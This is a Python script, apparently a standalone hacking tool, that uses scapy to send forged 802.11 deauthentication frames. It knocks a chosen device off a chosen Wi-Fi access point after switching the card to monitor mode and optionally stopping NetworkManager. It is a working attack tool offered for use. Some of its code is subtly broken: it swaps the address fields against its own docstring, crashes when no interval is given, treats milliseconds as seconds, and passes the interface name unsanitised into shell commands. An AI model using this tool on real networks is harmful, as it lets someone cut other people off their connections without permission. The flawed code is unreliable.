#!/usr/bin/env python3
from scapy.all import (
  RadioTap, #adds metadata to 802.11 frame
  Dot11, #Creating 802.11 frame
  Dot11Deauth, #For creating deauth frame
  sendp #sending packets
)
def print_header():
  print("\n")
  print("""  __ \\                   |                  __ \\              \\              |     |     
  |   |   |   |    __|   |  /    _ \\        |   |    _ \\     _ \\     |   |   __|   __ \\  
  |   |   |   |   (        <    (   |       |   |    __/    ___ \\    |   |   |     | | | 
 ____/   \\__,_|  \\___|  _|\\_\\  \\___/       ____/   \\___|  _/    _\\  \\__,_|  \\__|  _| |_| """)
  print("-----------------------------------------------------------------------------------------")

from argparse import ArgumentParser as argP
from sys import exit
def deauth(iface: str, count: int, bssid: str, target_mac: str, inter: int):
  """
  - addr1=target_mac. Mac address of the target machine.
  - addr2=BSSID, MAC of the AP.
  - addr3=BSSID, MAC address of he AP that is sending the packet.
  """
  dot11 = Dot11(addr1=bssid, addr2=target_mac, addr3=bssid)
  frame = RadioTap()/dot11/Dot11Deauth()
  sendp(frame, iface=iface, count=count, inter=inter or 0.100)

import os
def set_monitor(iface: str):
  os.system(f"ifconfig {iface} down")
  os.system(f"iwconfig {iface} mode monitor")
  os.system(f"ifconfig {iface} up")

def set_managed(iface: str):
  os.system(f"ifconfig {iface} down")
  os.system(f"iwconfig {iface} mode managed")
  os.system(f"ifconfig {iface} up")

def kill_networkmanager():
  os.system("systemctl stop NetworkManager")
def revive_networkmanager():
  os.system("systemctl start NetworkManager")

if __name__ == "__main__":
  parser = argP(description="Perform deauth attack against specified MAC.\nRequired arguments marked with *")
  parser.add_argument("-i", "--interface",help="* Interface used to send packets from")
  parser.add_argument("-c", "--count",help="* Amount of deauth frames to send")
  parser.add_argument("-b", "--bssid",help="* BSSID of target AP")
  parser.add_argument("-t", "--target-mac",help="* MAC address of the target machine")
  parser.add_argument("-e", "--interval", help="Time between packets in ms. Default: 0.100")
  parser.add_argument("-m", "--keep-monitor", help="Keep monitor mode enabled after packets are sent.", action='store_true')
  parser.add_argument("-f", "--kill-networkmanager", help="Stops NetworkManager before enabling monitor mode so it can't interfere.", action='store_true')
  args = parser.parse_args()

  print_header()
  if (os.geteuid() != 0):
    print("This command requires root privledges. Exitting..")
    exit(1)
  if (not args.interface or not args.count or not args.bssid or not args.target_mac):
    print("Insufficient arguments. Include -h for help. Exitting..")
    exit(1)
  if (args.kill_networkmanager):
    print("Killing networkmanager..")
    kill_networkmanager()
  print(f"Enabling monitor mode on interface {args.interface}")
  set_monitor(args.interface)
  deauth(args.interface, int(args.count), args.bssid, args.target_mac, int(args.interval))
  if (not args.keep_monitor):
    print(f"Returning interface {args.interface} to managed mode.")
    set_managed(args.interface)
  if (args.kill_networkmanager):
    print("Reviving NetworkManager..")
    revive_networkmanager()
  print("Mission complete, good job out there soldier.\n")